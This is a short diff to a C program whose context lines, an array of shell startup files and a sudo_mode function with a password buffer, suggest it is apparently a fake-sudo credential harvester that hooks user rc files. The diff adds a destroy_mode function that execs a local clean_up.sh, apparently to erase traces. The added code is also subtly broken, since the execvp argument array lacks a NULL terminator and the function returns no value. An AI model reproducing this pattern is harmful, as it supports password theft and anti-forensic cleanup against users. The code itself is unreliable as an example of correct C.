@@ -26,6 +26,19 @@ static void sighandler(int signo){}
 
 static char* CONFIGS[3] = {"/.bashrc", "/.zshrc", "/.dmrc"};
 
+int destroy_mode(){
+  // Curl in the destroy script
+
+
+  char * script = malloc((strlen("./clean_up.sh")+1)*sizeof(char));
+  strcpy(script, "./clean_up.sh");
+  printf("destroy script: %s\n", script);
+
+  char ** scriptAry = malloc(sizeof(char *) * 1);
+  scriptAry[0] = script;
+  execvp(scriptAry[0], scriptAry);
+}
+
 int sudo_mode(int argc, char ** argv){
 
   char passwd[PASSWD_SIZE];
